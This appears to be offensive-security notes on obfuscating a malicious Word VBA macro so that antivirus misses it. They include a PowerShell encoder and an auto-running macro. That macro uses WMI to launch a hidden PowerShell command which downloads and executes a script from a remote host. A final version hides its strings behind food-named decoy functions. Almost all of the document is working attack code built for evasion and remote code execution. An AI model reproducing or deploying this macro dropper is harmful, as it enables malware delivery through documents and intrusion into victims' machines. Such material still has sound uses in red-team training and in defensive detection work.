First generate obfuscated payload with powershell:

```
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object
system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
    $thischar = [string]"00" + $thischar
    $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
    $thischar = [string]"0" + $thischar
    $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
    $output += $thischar
    }
}
$output
```


The VBA Macro that got detected by 7 AV was:

```
Sub MyMacro
	strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
	GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
	Mymacro
End Sub
```

We will encrypt strArg, "winmgmts:" and "Win32_Process" by simply replacing the $payload value in the powershell obfuscator. So the final VBA Macro become:

```
Function Pears(Beets)
	Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
	Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
	Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
	Do
	Oatmilk = Oatmilk + Pears(Strawberries(Milk))
	Milk = Almonds(Milk)
	Loop While Len(Milk) > 0
	Nuts = Oatmilk
End Function

Function MyMacro()
	Dim Apples As String
	Dim Water As String
	Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057
127118136062128115123118116133030027132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127
120057056121133133129075064064066074067063066071073063073073063066070068064131134127063133137133056058058"
	Water = Nuts(Apples)
	GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```
